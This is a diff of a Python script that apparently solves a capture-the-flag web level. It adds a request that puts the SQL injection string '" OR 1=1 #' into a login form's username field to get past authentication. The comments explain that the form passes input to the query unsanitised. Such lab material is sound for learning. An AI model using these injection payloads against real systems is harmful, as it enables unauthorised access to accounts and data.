@@ -20,7 +20,7 @@ print(f'{div_content}\n')
 
 # get the source code
 response = session.get(URL + 'index-source.html')
-print(response.text)
+# print(response.text)
 
 
 """
@@ -46,3 +46,13 @@ if(array_key_exists("username", $_REQUEST)) {
 # as we can see in the source code, the user inputs, which include the username and the password, are immediately 
 # passed on to the sql query with no sanitisation
 # therefore, we can perform a SQL injection attack
+data = {
+    "username" : "\" OR 1=1 # A",
+    "password" : "",
+    "submit" : "submit"
+}
+response = session.post(URL + 'index.php', data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(div_content)
+
+
